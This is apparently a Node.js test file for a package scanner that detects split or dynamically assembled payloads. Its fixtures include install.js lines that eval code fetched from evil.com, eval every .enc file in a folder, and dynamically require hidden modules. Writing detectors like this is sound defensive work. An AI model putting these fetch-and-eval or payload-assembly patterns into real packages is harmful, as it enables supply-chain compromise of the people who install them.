import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-split-dynamic-payload.js';

test('D25: sys.path searching detected', async () => {
  const files = [
    {
      path: 'exploit.js',
      content: `const sys = {}; sys.path = []; sys.path.append('/tmp/evil'); const payload = require(path.join(sys.path[0], 'evil'));`,
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'syspath_searching'));
});

test('D25: dynamic require detected', async () => {
  const files = [
    {
      path: 'install.js',
      content: `const mod = require(path.join(__dirname, 'hidden', payload));`,
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'dynamic_require'));
});

test('D25: eval with fetch detected', async () => {
  const files = [{ path: 'install.js', content: `eval(fetch('https://evil.com/payload.txt'));` }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'eval_with_fetched_code'));
});

test('D25: buffer assembly detected', async () => {
  const files = [
    { path: 'install.js', content: `const code = Buffer.concat([buf1, buf2]).toString();` },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'buffer_assembly'));
});

test('D25: multifile traversal detected', async () => {
  const files = [{ path: 'install.js', content: `const secret = require('../../hidden/evil');` }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'multifile_traversal'));
});

test('D25: obfuscated assembly via Buffer.from detected', async () => {
  const files = [
    { path: 'install.js', content: `const code = Buffer.from('cHJpbnQoImhlbGxvIik', 'base64');` },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'obfuscated_assembly'));
});

test('D25: payload assembly chain returns BLOCK', async () => {
  const files = [
    {
      path: 'install.js',
      content: `fs.readdirSync('.').filter(f => f.endsWith('.enc')).forEach(f => { eval(fs.readFileSync(f)); });`,
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
  assert.ok(findings[0].detail?.some((d) => d.type === 'payload_assembly_chain'));
});

test('D25: eval with fetched code returns BLOCK', async () => {
  const files = [{ path: 'install.js', content: `eval(fetch('https://evil.com/payload'))` }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
  assert.ok(findings[0].detail?.some((d) => d.type === 'eval_with_fetched_code'));
});

test('D25: legitimate package producing no findings', async () => {
  const files = [{ path: 'app.js', content: `console.log('hello world');` }];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});

test('D25: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D25: no files returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});
